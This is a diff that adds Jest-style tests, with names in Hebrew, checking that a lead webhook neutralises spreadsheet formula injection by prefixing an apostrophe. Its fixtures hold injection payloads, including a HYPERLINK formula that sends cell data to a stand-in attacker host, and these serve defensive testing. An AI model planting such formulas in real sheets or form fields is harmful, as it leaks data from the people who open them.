@@ -337,3 +337,67 @@ describe("toWebhookPayload", () => {
     });
   });
 });
+
+describe("toWebhookPayload: הגנה מהזרקת נוסחה לגיליון", () => {
+  const lead: Lead = {
+    name: '=HYPERLINK("https://evil.example/?d="&A1,"לחצו")',
+    email: "dana@example.co.il",
+    phone: "0501234567",
+    marketingConsent: true,
+  };
+  const record = () =>
+    buildLeadRecord(
+      lead,
+      pickTracking({
+        utm_source: "+cmd",
+        utm_medium: "-1+1",
+        utm_campaign: "@SUM(A1)",
+        utm_content: "=IMPORTXML(\"x\")",
+        utm_term: "רגיל",
+        fbclid: "-IwAR",
+        fbp: "=fb",
+        fbc: "+fb",
+        referrer: "=https://x",
+        landingPath: "=1",
+      }),
+      {
+        now: new Date("2026-11-01T10:00:00.000Z"),
+        baseUrl: new URL("https://example.co.il"),
+      },
+    );
+
+  it("שדות חופשיים שמתחילים ב-= + - @ מקבלים גרש בהתחלה", () => {
+    const p = toWebhookPayload(record());
+    expect(p.name).toBe(`'${lead.name}`);
+    expect(p.utm_source).toBe("'+cmd");
+    expect(p.utm_medium).toBe("'-1+1");
+    expect(p.utm_campaign).toBe("'@SUM(A1)");
+    expect(p.utm_content).toBe("'=IMPORTXML(\"x\")");
+    expect(p.referrer).toBe("'=https://x");
+    expect(p.landingPath).toBe("'=1");
+    expect(p.source).toBe("'+cmd");
+    expect(p.utm_term).toBe("רגיל");
+  });
+
+  it("טאב בהתחלה גם מנוטרל", async () => {
+    const { neutralizeFormula } = await import("@/lib/lead");
+    expect(neutralizeFormula("\t=1")).toBe("'\t=1");
+    expect(neutralizeFormula("ok")).toBe("ok");
+    expect(neutralizeFormula("")).toBe("");
+  });
+
+  it("טלפון, מייל ומזהים לא משתנים, וגם הגיבוי (הרשומה) נשאר כמו שנשלח", () => {
+    const r = record();
+    const p = toWebhookPayload(r);
+    expect(p.email).toBe("dana@example.co.il");
+    expect(p.phone).toBe("0501234567");
+    expect(p.id).toBe(r.id);
+    expect(p.eventId).toBe(r.eventId);
+    expect(p.fbclid).toBe("-IwAR");
+    expect(p.fbp).toBe("=fb");
+    expect(p.fbc).toBe("+fb");
+    expect(p.pageUrl).toBe(r.pageUrl);
+    expect(r.lead.name).toBe(lead.name);
+    expect(r.tracking.utm_source).toBe("+cmd");
+  });
+});
